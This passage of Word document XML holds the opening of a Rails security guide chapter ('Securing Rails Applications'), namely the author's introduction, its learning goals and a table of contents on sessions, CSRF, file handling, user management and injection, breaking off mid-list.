      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> with additional helpers, macros, and assertions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC7762D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="321"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId651" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>RSpec</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t>, a behavior-driven development framework</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210D5260" w14:textId="2511D113" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.5、</w:t>
      </w:r>
      <w:hyperlink r:id="rId652" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Securing Rails Applications</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="171DDEEE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This manual describes common security problems in web applications and how to avoid them with Rails. If you have any questions or suggestions, please mail me, Heiko Webers, at 42 {_et_} rorsecurity.info. After reading it, you should be familiar with:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFE10D2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="322"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">All countermeasures </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>that are highlighted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D8499F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="322"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>The concept of sessions in Rails, what to put in there and popular attack methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048CF9A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="322"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">How just visiting a site can be a security problem (with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F5271E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="322"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>What you have to pay attention to when working with files or providing an administration interface</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E8A862" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="322"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>The Rails-specific mass assignment problem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60907CA5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="322"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>How to manage users: Logging in and out and attack methods on all layers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220AC19D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="322"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>And the most popular injection attack methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B262FA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038BDA7B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId653" w:anchor="1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Introduction</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="27494301" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId654" w:anchor="2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Sessions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="409C382F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId655" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>What are Sessions?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="44242D1A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId656" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Session id</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3AE329F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId657" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Session Hijacking</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="37CDDBAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId658" w:anchor="2-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Session Guidelines</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6F712162" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId659" w:anchor="2-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Session Storage</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="621AACE1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId660" w:anchor="2-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Replay Attacks for CookieStore Sessions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="34670C61" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId661" w:anchor="2-7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Session Fixation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7052BA81" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId662" w:anchor="2-8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Session Fixation – Countermeasures</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="30C9DBD4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId663" w:anchor="2-9" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Session Expiry</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B031C52" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId664" w:anchor="3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Cross-Site Request Forgery (</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>CSRF</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="51625A7E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId665" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>CSRF</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Countermeasures</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="45367268" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId666" w:anchor="4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Redirection and Files</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="54CFE96E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId667" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Redirection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="473AFF25" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId668" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>File Uploads</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3D5B14A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId669" w:anchor="4-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Executable Code in File Uploads</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6A33CE7D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId670" w:anchor="4-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>File Downloads</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6085755D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId671" w:anchor="5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Intranet and Admin Security</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7AF45676" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId672" w:anchor="5-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Additional Precautions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0AA5D95E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId673" w:anchor="6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Mass Assignment</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="17909F3A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId674" w:anchor="6-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Countermeasures</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="223930C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId675" w:anchor="7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>User Management</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="071087A1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId676" w:anchor="7-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Brute-Forcing Accounts</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="202FD659" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId677" w:anchor="7-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Account Hijacking</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="663EEA46" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId678" w:anchor="7-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>CAPTCHAs</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="16AE6662" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId679" w:anchor="7-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Logging</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B9A871B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId680" w:anchor="7-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Good Passwords</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="323DF7EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId681" w:anchor="7-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Regular Expressions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0E5CB56F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId682" w:anchor="7-7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Privilege Escalation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="15A92C9B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId683" w:anchor="8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Injection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="16210283" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId684" w:anchor="8-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Whitelists versus Blacklists</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0B6A2B04" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId685" w:anchor="8-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>SQL</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Injection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0301009D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="323"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId686" w:anchor="8-3" w:history="1">
